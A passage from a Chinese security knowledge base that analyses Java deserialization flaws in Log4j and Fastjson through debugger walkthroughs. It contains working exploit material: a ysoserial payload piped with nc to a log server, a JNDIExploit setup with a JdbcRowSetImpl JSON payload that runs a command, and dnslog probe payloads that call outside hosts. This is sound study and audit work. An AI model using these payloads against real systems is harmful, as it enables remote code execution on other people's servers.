最后，通过Layout来格式化日志信息，例如，自动添加日期、时间、方法名称等信息。 基础使用 pom.xml org.apache.logging.log4j log4j-core 2.8.1 log4j2.xml https://blog.csdn.net/pan_junbiao/article/details/104313938 我们把一个log4j2.xml的文件放到classpath下就可以让Log4j读取配置文件并按照我们的配置来输出日志。 [%-5p] %d %c - %m%n =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n logs/myLog.log Test.java package org.example; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import java.util.function.LongFunction; public class Test { public static void main( String[] args ) { Logger logger = LogManager.getLogger(LongFunction.class); logger.trace(\"trace level\"); logger.debug(\"debug level\"); logger.info(\"info level\"); logger.warn(\"warn level\"); logger.error(\"error level\"); logger.fatal(\"fatal level\"); } } CVE-2017-5645 简介 Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。在使用TCP/UDP 套接字接口监听获取序列化的日志事件时，存在反序列化漏洞。 环境准备 org.apache.logging.log4j log4j-core 2.8.1 com.beust jcommander 1.48 直接复现 环境启动 找到刚才下载的jar包，执行如下命令启动监听6666端口 java -cp log4j-core-2.8.1.jar:log4j-api-2.8.1.jar:jcommander-1.48.jar org.apache.logging.log4j.core.net.server.TcpSocketServer -p 6666 漏洞复现 使用ysoserial直接生成恶意的序列化数据，并发送给6666端口 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://jqi53t.dnslog.cn | nc 127.0.0.1 6666 使用URLDNS链，反序列化后查看DNSLOG，已经收到请求 DEBUG分析 编写启动代码，其实主要就是调用了org.apache.logging.log4j.core.net.server.TcpSocketServer.main()，和前面命令行启动一样 package org.example; import org.apache.logging.log4j.core.net.server.TcpSocketServer; public class Test { public static void main(String[] args) throws Exception { String[] arg = {\"-p\", \"6666\"}; TcpSocketServer.main(arg); } } 分析一下整个过程，在main()那下断点，启动 跟进main() BasicCommandLineArguments.parseCommandLine()不难猜出是解析参数的，跳过 经过一些判断，到了 createSerializedSocketServer()方法，看名字是创建序列化socket服务端，跟进去 发现创建了一个TcpSocketServer，并且调用LOGGER.exit()方法返回，LOGGER.exit的功能就是对日志做些操作，然后仍然返回传进来的对象，所以这里相当于就是返回了TcpSocketServer。 返回TcpSocketServer.clss的main()方法，调用了socketServer.startNewThread()，看名字是新建一个线程，跟进去 AbstractSocketServer类实现了Runnable接口，在启动新线程的时候，会自动调用run()方法；（不熟悉可以去看看Java多线程） 这里多线程的任务程序是this，而此时的this是TcpSocketServer，所以会调用TcpSocketServer.run()方法，看下对应的run()方法 可见里面调用了serverSocket.accept()方法，返回一个Socket，这个没啥影响，但此时已经开始监听我们设定的端口了 手动向该端口发送数据，触发后续流程 然后用clientSocket实例化SocketHandler 看下SocketHandler的构造函数，给this.inputStream赋值 而TcpSocketServer.this.logEventInput的类是ObjectInputStreamLogEventBridge，这里相当于调用了它的wrapStream方法 接收到数据后的整个流程，就是把socket连接传过来的数据流作为包装成ObjectInputStream，现在this.inputStream就是一个来自用户输入的ObjectInputStream流了。 回到TcpSocketServer的run方法 继续往下，执行了handler.start()，而handler是SocketHandler类的实例，这个类继承自Log4jThread，Log4jThread又继承自Thread类，所以他是一个自定义的线程类，自定义的线程类有个特点，那就是必须重写run方法，而且当调用自定义线程类的start()方法时，会自动调用它的run()方法 然后默认会进入到TcpSocketServer.this.logEventInput.logEvents这个方法，跟进 调用了readObject()进行反序列化，然后触发我们的恶意链，到此分析结束 总结：inputStream就是被封装成ObjectInputStream流的、我们通过tcp发送的数据。所以只要log4j的tcpsocketserver端口对外开放，且目标存在可利用的pop链，我们就可以通过tcp直接发送恶意的序列化payload实现RCE。 CVE-2019-17571 简介 https://logging.apache.org/log4j/1.2/ 和上面的CVE差不多，只是触发点是SocketNode的run()方法，且这个地方需要的log4j的版本是1.2，感觉是为了凑CVE？ 环境准备 log4j log4j 1.2.17 Debug分析 启动函数，有错误啥的可以不用管，不影响复现 package org.example; import org.apache.log4j.net.SocketServer; public class Test { public static void main(String[] args) { String[] arg = {\"6666\", \"./\", \"./\"}; SocketServer.main(arg); } } 一样的，main下断点 跟进main，先初始化参数 然后一直到serverSocket.accept，开启监听 传入恶意的序列化数据 继续往下，先实例化SocketNode，然后实例化Thread，最后调用start 跟进SocketNode，发现会将我们传入的数据转换成ObjectInputStream类，并赋值给变量ois 然后返回main方法中，发现调用了start()方法，根据多线程，调用start()方法其实就是调用了对应类的run()方法，这里其实就是调用的SocketNode.run() 跟进SocketNode.run()，发现this.ois调用了方法readObject()，至此反序列化完成 查看dnslog日志，成功触发 其他 log4j是一个日志组件，在用log4j搭建日志服务器集中管理日志的时候会用到socketserver这种机制，试了一下用nmap识别不出服务，所以还是以审计发现该漏洞为主吧。 Log4j2 TcpSocketServer 日志集中打印 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/2.各种分析/04.Fastjson 1.2.24反序列化漏洞分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/2.各种分析/04.Fastjson 1.2.24反序列化漏洞分析.html","title":"04.Fastjson 1.2.24反序列化漏洞分析","keywords":"","body":" 前言 DEMO 环境搭建 序列化 反序列化‼️ 利用链 分析 利用 复现 总结 DEBUG分析 修复方案 一些细节 举例演示 分析 TemplatesImpl攻击调用链路 参考链接 前言 前面讲了JNDI注入相关的知识，不实际操作操作怎么能行呢！ 这里就主要分析一下fastjson 1.2.24版本的反序列化漏洞，这个漏洞比较普遍的利用手法就是通过JNDI注入的方式实现RCE，所以是一个不得不分析的JNDI注入实践案例！ 这里不同与我们之前分析的反序列化，fastjson是一个非常流行的库，它可以将数据在JSON和Java Object之间互相转换，我们常说的fastjson序列化就是将java对象转化为json字符串，而反序列化就是将json字符串转化为java对象。 DEMO 环境搭建 pom.xml com.alibaba fastjson 1.2.24 序列化 package org.example; import com.alibaba.fastjson.JSON; public class App { public static void main( String[] args ){ User user = new User(); user.setAge(66); user.setUsername(\"test\"); String json = JSON.toJSONString(user); System.out.println(json); } } class User{ private String username; private int age; public void setUsername(String username) { this.username = username; } public String getUsername() { return username; } public void setAge(int age) { this.age = age; } public int getAge() { return age; } } 运行后，得到对应的JSON格式字符串 反序列化‼️ fastjson反序列化到对应类的过程中会自动调用目标对象的setXXX方法，例如{\"age\":66,\"username\":\"test\"}被反序列化为User类时会自动调用User类的setAge以及setUsername方法，实践出真知 修改一下User类，在setXXX方法里面添加输出 class User{ private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { return age; } } 修改App启动类，反序列化生成User对象 package org.example; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class App { public static void main( String[] args ){ String json = \"{\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; User user = JSON.parseObject(json, User.class); // 后面的User.class表示反序列化为User类 } } 执行后，可以看到在反序列化的过程中确实调用了setXXX的方法 这里我们反序列化使用的是parseObject()方法，其实也可以用到parse()方法，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()； 他们的最主要的区别就是前者返回的是JSONObject，而后者会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，返回的是实际类型的对象；当在没有对应类的定义的情况下（没有在@type声明类），通常情况下都会使用JSON.parseObject来获取数据。 由于JSON.parseObject()要反序列化到对应的对象（比如demo中的User类对象，需要将第二个参数设置为User.class）才会触发类的setXXX方法，而直接使用该方法返回的是JSONObject对象，是不会触发setXXX方法的（因为JVM也不知道是哪个类的对象） 那要怎么处理才能让JSON.parseObject()在调用时，不输入第二个参数也能执行setXXX方法呢，答案就是上面利用parse()方法使到的用@type属性。 fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。 举个例子： package org.example; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class App { public static void main(String[] args) { String json1 = \"{\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; String json2 = \"{\\\"@type\\\":\\\"org.example.User\\\", \\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; System.out.println(\"反序列化JSON1\"); JSON.parseObject(json1); System.out.println(\"反序列化JSON1\"); JSON.parseObject(json2); } } class User { private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { return age; } } 执行后，没有@type返回JSONObject，有@type则返回对应的类对象且成功调用了setXXX方法 可见@type参数的作用就是指定json字符串要反序列化为哪个类的对象，而就是这个属性，让我们能够对其进行漏洞利用。 利用链 分析 由于在反序列化的过程中会自动调用@type类中相关的setXXX方法，如果我们能找到一个类，且这个类的setXXX方法可以通过我们对参数的构造达到命令执行的效果，那攻击的目的不就达到了吗？ 如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。 不过一般没人会给私有属性加setter方法，加了就没必要声明为private了 经过大佬们的分析，就发现了com.sun.rowset.JdbcRowSetImpl这个类可以被利用 这个类中有很多的setXXX方法，但我们需要利用的，则是setDataSourceName()和setAutoCommit()这两个方法 JdbcRowSetImpl.setDataSourceName public void setDataSourceName(String var1) throws SQLException { if (this.getDataSourceName() != null) { if (!this.getDataSourceName().equals(var1)) { super.setDataSourceName(var1); this.conn = null; this.ps = null; this.rs = null; } } else { super.setDataSourceName(var1); } } 这里调用了父类的setDataSourceName方法，跟一下 BaseRowSet.setDataSourceName public void setDataSourceName(String name) throws SQLException { if (name == null) { dataSource = null; } else if (name.equals(\"\")) { throw new SQLException(\"DataSource name cannot be empty string\"); } else { dataSource = name; } URL = null; } 可以看到就是设置了dataSource JdbcRowSetImpl.setAutoCommit public void setAutoCommit(boolean var1) throws SQLException { if (this.conn != null) { this.conn.setAutoCommit(var1); } else { this.conn = this.connect(); this.conn.setAutoCommit(var1); } } 进行了connect()操作，跟进connect() JdbcRowSetImpl.connect private Connection connect() throws SQLException { if (this.conn != null) { return this.conn; } else if (this.getDataSourceName() != null) { try { InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); return this.getUsername() != null && !this.getUsername().equals(\"\") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection(); } catch (NamingException var3) { throw new SQLException(this.resBundle.handleGetObject(\"jdbcrowsetimpl.connect\").toString()); } } else { return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null; } } 可以看到这里有JNDI注入中的lookup的调用，而调用的参数就是刚才设置的dataSource，这个是我们可以控制的，如果让他加载恶意的Reference类，那么我们的目的就达成了。 利用 根据之前的学习和分析，利用类com.sun.rowset.JdbcRowSetImpl，利用的set方法setDataSourceName和setAutoCommit，构造payload { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"恶意的Reference类\", \"autoCommit\": true/false } 复现 直接用JNDIExploit同时启动ldap和http服务，好处就是不需要自己手动编译class什么的了 当然也可以使用marshalsec快速开启rmi或者ldap服务，再手动开启http服务 # 查看用法 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -l 9999 -p 8888 -u # 启动服务 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -l 9999 -p 8888 反序列化json package org.example; import com.alibaba.fastjson.JSON; public class App { public static void main(String[] args) { // 高版本的JDK，需要设置一下，低版本的可以忽略，参考JNDI注入文章 System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); String json = \"{\\\"@type\\\": \\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\": \\\"ldap://127.0.0.1:9999/Basic/Command/open -na Calculator\\\",\\\"autoCommit\\\": false}\"; JSON.parseObject(json); } } 总结 整个过程其实也很简单，就是fastjson在反序列化的时候，会调用对应类设置了参数的setXXX方法，只需要找到一些对应的链，同时jdk满足要求就可以命令执行。 DEBUG分析 代码举例 package org.example; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class App { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"org.example.User\\\",\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; JSONObject jsonObject = JSON.parseObject(json); } } class User { private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { return age; } } 因为我们现在知道反序列化的时候会调用setXXX的方法，所以现在setXXX方法处下个断点，看看堆栈情况 setAge:28, User (org.example) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) parseObject:201, JSON (com.alibaba.fastjson) main:10, App (org.example) 然后从下向上定位分析就行了，调用了哪个包重哪些类的哪些方法，一应俱全，避免一直F7、F8浪费时间，可以把精力放到参数的传递追踪上。 修复方案 1.2.25官方对漏洞进行了修复，对更新的源码进行比较，主要的更新在checkAutoType函数 public Class checkAutoType(String typeName, Class expectClass) { if (typeName == null) { return null; } else { String className = typeName.replace('$', '.'); if (this.autoTypeSupport || expectClass != null) { int i; String deny; for(i = 0; i clazz = TypeUtils.getClassFromMapping(typeName); if (clazz == null) { clazz = this.deserializers.findClass(typeName); } if (clazz != null) { if (expectClass != null && !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } else { return clazz; } } else { if (!this.autoTypeSupport) { String accept; int i; for(i = 0; i \" + expectClass.getName()); } return clazz; } } } if (this.autoTypeSupport || expectClass != null) { clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader); } if (clazz != null) { if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) { throw new JSONException(\"autoType is not support. \" + typeName); } if (expectClass != null) { if (expectClass.isAssignableFrom(clazz)) { return clazz; } throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } } if (!this.autoTypeSupport) { throw new JSONException(\"autoType is not support. \" + typeName); } else { return clazz; } } } } 这里遍历denyList数组，只要引用的库中是以我们的黑名单中的字符串开头的就直接抛出异常中断运行。 denyList数组，主要利用黑名单机制把常用的反序列化利用库都添加到黑名单中，主要有： bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework 一些细节 parseObject(String text)在反序列化时也会调用getter方法，所以也是一个可利用的点，只不过比较鸡肋，符合条件的利用链很少 举例演示 package org.example; import com.alibaba.fastjson.JSON; public class App { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"org.example.User\\\",\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; System.out.println(\"parseObject(String)\"); JSON.parseObject(json); System.out.println(\"parse(String)\"); JSON.parse(json); } } class User { private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { System.out.println(\"call getUsername\"); return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { System.out.println(\"call getAge\"); return age; } } 分析 为什么会调用getter()方法呢？在getter()方法的地方下断点，查看调用栈 getAge:37, User (org.example) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) get:451, FieldInfo (com.alibaba.fastjson.util) getPropertyValue:114, FieldSerializer (com.alibaba.fastjson.serializer) getFieldValuesMap:439, JavaBeanSerializer (com.alibaba.fastjson.serializer) toJSON:902, JSON (com.alibaba.fastjson) toJSON:824, JSON (com.alibaba.fastjson) parseObject:206, JSON (com.alibaba.fastjson) main:10, App (org.example) 分析调用栈，首先进入parseObject方法，然后正常调用parse方法（PS：此时setter方法已经被调用了，可以查看Console栏当前输出的情况） 所以调用getter方法的原因，不是出在parse函数里面，而是调用了(JSONObject)toJSON(obj)方法 继续跟toJSON方法，发现会到javaBeanSerializer.getFieldValuesMap(javaObject) 查看当前的变量，javaBeanSerializer中的getters存放了相关的getter方法后缀，javaObject中存放了相关变量的值 跟进getFieldValuesMap，发现通过Map.put存入数据，值通过getter.getPropertyValue(object)进行获取，object存放的是setter设置的变量名和值 跟进getPropertyValue，会调用this.fieldInfo.get方法 跟进get，发现反射调用User类的getAge()方法 所以getter方法被执行了 TemplatesImpl攻击调用链路 https://paper.seebug.org/1274/#templatesimpl 参考链接 Fastjson 1.2.24 反序列化漏洞深度分析 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/2.各种分析/05.Fastjson的dnslog探测方式分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/2.各种分析/05.Fastjson的dnslog探测方式分析.html","title":"05.Fastjson的dnslog探测方式分析","keywords":"","body":" 前言 说明 分析 挖掘 java.net.InetSocketAddress java.net.Inet4Address java.net.Inet6Address java.net.URL java.net.URI 总结 参考文献 前言 正常测试的时候，发现java后端对json处理都会去测试一下是否存在反序列化，但是后端处理json的组件很多，比如fastjson、jackson、gson等，怎么判断是否使用了fastjson呢？ 有一个简便无危害的方式，就是通过dnslog来判断。 大佬们讨论的issue 说明 前面我们在分析的时候，会发现很多有一个变量token在进行判断，比如token == 12 或者 token == 14等，那这个token到底代表啥呢？在com.alibaba.fastjson.parser.JSONToken中我们可以找到答案 public static String name(int value) { switch(value) { case 1: return \"error\"; case 2: return \"int\"; case 3: return \"float\"; case 4: return \"string\"; case 5: return \"iso8601\"; case 6: return \"true\"; case 7: return \"false\"; case 8: return \"null\"; case 9: return \"new\"; case 10: return \"(\"; case 11: return \")\"; case 12: return \"{\"; case 13: return \"}\"; case 14: return \"[\"; case 15: return \"]\"; case 16: return \",\"; case 17: return \":\"; case 18: return \"ident\"; case 19: return \"fieldName\"; case 20: return \"EOF\"; case 21: return \"Set\"; case 22: return \"TreeSet\"; case 23: return \"undefined\"; case 24: return \";\"; case 25: return \".\"; case 26: return \"hex\"; default: return \"Unknown\"; } } 分析 fastjson 1.2.68 jdk 8u261 分析一下checkAutoType 这个黑名单检测绕过后，会来到如下几个if语句，写了个简单的注释 // 从ConcurrentHashMap类变量mapping中尝试获取这个类，mappings有点像维护的一个基础类库 clazz = TypeUtils.getClassFromMapping(typeName); // 如果mapping里面没有这个类，就会尝试从this.deserializers.buckets这个IdentityHashMap类的Map中尝试获取clazz，这个有点像开发者维护的一个可信任类 if (clazz == null) { clazz = this.deserializers.findClass(typeName); } // 如果clazz还是为null，就会尝试从this.typeMapping中去获取类，但这个类默认是空的 if (clazz == null) { clazz = (Class)this.typeMapping.get(typeName); } // 如果在白名单，就直接加载这个clazz if (internalWhite) { clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true); } // 如果clazz不为null，且不满足后续的判定条件，就直接返回clazz if (clazz != null) { if (expectClass != null && clazz != HashMap.class && !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } else { return clazz; } } 也就是说，如果我们能在上面的几个Map中找到一些可利用的类，那么默认情况下（关闭autoType的情况）就可以绕过黑白名单检查，直接返回clazz进入后续操作 分析一下里面一共有哪些类 mappings ((ConcurrentHashMap) mappings).keySet() this.buckets Object[] a = new Object[9000]; for(int i = 0; i this.typeMapping 默认为空 汇总一下所有类： java.lang.IndexOutOfBoundsException java.lang.Integer java.lang.NoSuchFieldException java.lang.Long java.math.BigInteger java.lang.LinkageError java.lang.StringIndexOutOfBoundsException java.lang.StackOverflowError long java.lang.VerifyError java.util.LinkedHashMap java.util.Calendar java.lang.StackTraceElement [long java.lang.NoSuchMethodError java.util.concurrent.atomic.AtomicLong java.util.TreeMap java.util.Date java.lang.NoSuchFieldError java.util.concurrent.atomic.AtomicInteger java.lang.Short java.util.Locale java.lang.InstantiationException java.lang.SecurityException java.sql.Timestamp java.util.concurrent.ConcurrentHashMap java.util.UUID java.lang.IllegalAccessError com.alibaba.fastjson.JSONObject [short java.util.HashSet [byte java.lang.Boolean java.sql.Date short java.lang.Object java.util.BitSet [char java.lang.Float java.math.BigDecimal java.lang.Character java.lang.InternalError [double byte double java.lang.Exception java.lang.Double [B java.lang.TypeNotPresentException [C [D java.text.SimpleDateFormat [F [I java.util.TreeSet [J java.util.ArrayList java.lang.IllegalMonitorStateException com.alibaba.fastjson.JSONArray [S java.lang.String java.lang.Number java.util.LinkedHashSet [Z java.lang.NegativeArraySizeException java.lang.NumberFormatException java.lang.RuntimeException char java.lang.OutOfMemoryError java.lang.IllegalStateException java.sql.Time java.lang.NoSuchMethodException java.util.Collections$EmptyMap [boolean float java.lang.AutoCloseable java.lang.NullPointerException java.lang.Byte [int com.alibaba.fastjson.JSONPObject java.lang.Cloneable java.lang.IllegalAccessException java.util.IdentityHashMap java.util.HashMap java.lang.NoClassDefFoundError java.util.Hashtable java.util.WeakHashMap java.lang.IllegalThreadStateException java.lang.IllegalArgumentException int java.util.concurrent.TimeUnit boolean java.lang.InstantiationError java.lang.InterruptedException [float java.util.regex.Pattern com.alibaba.fastjson.JSONArray java.lang.StringBuilder java.nio.charset.Charset java.math.BigDecimal char java.io.File java.lang.String boolean java.net.InetSocketAddress java.lang.Character java.lang.Number java.util.concurrent.ConcurrentHashMap javax.xml.datatype.XMLGregorianCalendar java.net.Inet4Address java.sql.Date java.util.Collection com.alibaba.fastjson.JSONPath java.util.concurrent.atomic.AtomicIntegerArray java.util.TreeMap short java.util.Currency java.sql.Time java.lang.Integer double java.lang.Class java.math.BigInteger com.alibaba.fastjson.JSONObject java.util.concurrent.atomic.AtomicBoolean java.util.concurrent.atomic.AtomicLongArray java.util.HashMap java.util.TimeZone java.lang.Comparable java.util.ArrayList java.text.SimpleDateFormat com.alibaba.fastjson.JSONPObject java.lang.StringBuffer byte java.io.Closeable java.lang.Double java.util.concurrent.atomic.AtomicInteger int java.lang.Float java.net.URL java.util.List java.lang.Object java.sql.Timestamp java.lang.StackTraceElement java.net.Inet6Address java.util.concurrent.atomic.AtomicLong java.net.URI java.util.UUID java.lang.Cloneable java.util.LinkedHashMap long java.lang.Short java.lang.Byte [C java.lang.ref.WeakReference java.lang.ref.SoftReference java.util.concurrent.ConcurrentMap java.util.Calendar java.util.Date java.util.Locale java.lang.Long java.util.Map java.io.Serializable java.util.concurrent.atomic.AtomicReference java.lang.Boolean float 挖掘 既然已经拿到这些类了，我们大概筛选一下哪些是可以用的（这里筛选的是java.net.xxx的，因为带net的几乎都和网络相关可以发起请求） java.net.InetSocketAddress java.net.Inet4Address java.net.URL java.net.Inet6Address java.net.URI 那我们从第一个开始 java.net.InetSocketAddress 初始payload {\"@type\":\"java.net.InetSocketAddress\", \"a\":\"b\"} 通过checkAutoType后，成功按照我们的预期返回 然后跟到371行，执行反序列化操纵，跳过这一步会直接抛出错误异常，所以我们跟进 跟进后，判断类，通过 开始判断token，这个时候我们的token是16，即,，不等于8，进入else 来到了parser.accept(token)后，不知道这个函数干啥的，跟进一下，发现原来是判断当前的token是不是传入的token，很明显这里我们是16不是12，所以会抛出异常。 那我们修改一下payload，给他提供一个 {，也就是token=12 {\"@type\":\"java.net.InetSocketAddress\"{, \"a\":\"b\"} 这个时候我们就能成功通过accept这个函数了，继续向下 发现有个变量className，下方要求他等于address，且期望它下一位的token是17（:） 那我们看看className是怎么得来的，跟进stringVal 发现这就是一个字符串切割函数，this为我们输入的字符串，因为this.hasSpecial为false this.np就是当前这个字符串现在的游标位置，而this.sp则是切割的长度，我们再看下这个this.sp是怎么变得 前期阶段，是统计2个\"中间的长度的，方便后面切割 后面估计也差不多，发现在进入反序列化过后，paper.accept的时候，会调用nextToken，其中会用到this.sp 跟一下发现，这个字符就是我们payload中{后面的,，期望一个\"，但是我们传入的是,，所以this.sp就等于0了 所以还需要增加一对\"，来增加this.sp的值，达到切割字符串的目的 {\"@type\":\"java.net.InetSocketAddress\"{\"aaa\", \"a\":\"b\"} 更换payload后，成功通过上方的判断，进入this.scanString()，这里面this.sp++会判断我们输入的字符串长度 此时this.sp问题解决了，我们继续回到lexer.stringVal()，跟进，可以看到现在切割出来的字符串，就是我们传入的aaa 继续往后，发现className要等于address，所以给我们的aaa改成address即可，此外期望token是17，那还需要加一个: 所以修改后的payload {\"@type\":\"java.net.InetSocketAddress\"{\"address\":\"aaa\", \"a\":\"b\"} 一路顺利，到了parser.parseObject这里会进行类型转换为InetAddress 又是一路顺利，到了deserializer.deserialze,只不过这次传入的Type是InetAddress 又回到了熟悉的地方 然后一顿调，抛出异常了 回看了一下，原来是这个地方要求是16（:），而我们是4（String）。。。 那哪个地方的String出问题了呢？ 分析一下当前游标的位置，发现就是\"address\":后面应该是个,，而不是String 所以再改payload {\"@type\":\"java.net.InetSocketAddress\"{\"address\":, \"a\":\"b\"} 又回到刚才的地方，这次过了，但是要求lexer.stringVal()为val 熟悉的函数，刚才我们分析过了，就是需要一个\"xxx\"，从上面也可以看出来\"a\"是我们后面的键值对中的键 那我们给a改成val {\"@type\":\"java.net.InetSocketAddress\"{\"address\":, \"val\":\"b\"} 然后回到刚才的条件，继续向后，都是满足的，我们payload中val的值赋给了objVal 类型转换，赋值给strVal 返回InetAddress.getByName(strVal) 而InetAddress.getByName会尝试通过域名获取IP 所以给strVal的值设置为dnslog的URL即可 最终Payload {\"@type\":\"java.net.InetSocketAddress\"{\"address\":, \"val\":\"enst5r.dnslog.cn\"} 成功 最后小小的总结一下：就是整个过程中，缺什么给他补什么 java.net.Inet4Address 初始payload {\"@type\":\"java.net.Inet4Address\", \"a\":\"b\"} 运行，经过checkAutoType后反序列化，和上面一样的错，需要val，而此时的值是a 我们给a换成val就行了 {\"@type\":\"java.net.Inet4Address\", \"val\":\"b\"} 最后解析的时候，一样的方法，InetAddress.getByName(strVal) 最终POC {\"@type\":\"java.net.Inet4Address\", \"val\":\"dnslog\"} java.net.Inet6Address 看了下，和 java.net.Inet4Address 一样，就不再写了 {\"@type\":\"java.net.Inet6Address\", \"val\":\"dnslog\"} java.net.URL 这个就不能直接来硬的了，根据我们之前分析过的ysoserial#URLDNS这条链，如果将一个URL对象放置到HashMap中，那么在进行计算hashcode的时候，会触发dnslog请求 所以我们让fastjson给对象反序列化为URL对象的后，再把它放到HashMap中即可 {{\"@type\":\"java.net.URL\", \"val\":\"http://8fhj7r.dnslog.cn\"}:\"a\"} 下断点分析，fastjson给前面还原成了URL对象，当做了key 然后继续跟，发现使用put将其添加到HashMap中，所以dnslog收到了请求 java.net.URI 不能和URL类类似似使用HashMap计算key的hashCode方法去发起请求 内部也没有类似的发起请求的方法 所以目前没找到利用方法emmmmm 总结 还有一些畸形的payload，可以去前言里面看看issue，原理都差不多 只是大佬们对fastjson的解析流程真的理解太透彻了，羡慕了 参考文献 通过dnslog探测fastjson的几种方法 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/2.各种分析/06.Fastjson各版本漏洞分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/2.各种分析/06.Fastjson各版本漏洞分析.html","title":"06.Fastjson各版本漏洞分析","keywords":"","body":" 前言 概念 演示代码 fastjson 1.2.24 fastjson 1.2.41 fastjson 1.2.42 fastjson 1.2.43 fastjson 1.2.45 fastjson 1.2.47 fastjson 1.2.62 fastjson 1.2.66 fastjson 1.2.68 fastjson黑名单 Payload转换 Fastjson姿势技巧集合 参考链接 前言 最先出现问题的Fastjson 1.2.24反序列化漏洞已经分析过了，产生漏洞的原理也差不多理解了 在1.2.25之后的版本，以及所有的.sec01后缀版本中，autotype功能默认是受限的（黑白名单机制） 在1.2.68之后的版本，fastjson增加了safeMode的支持。配置safeMode后，无论白名单和黑名单，都不支持autoType 概念 可能出现一些新的概念，给一些参考链接吧 FastJSON为什么要有autoType功能 enable_autotype fastjson_safemode 演示代码 后面的分析代码都以此为基础修改 package org.example; import com.alibaba.fastjson.JSON; public class App { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"org.example.User\\\",\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; System.out.println(JSON.parseObject(json)); } } class User { private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { System.out.println(\"call getUsername\"); return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { return age; } } fastjson 1.2.24 之前已经分析过了，就不在写了 fastjson 1.2.41 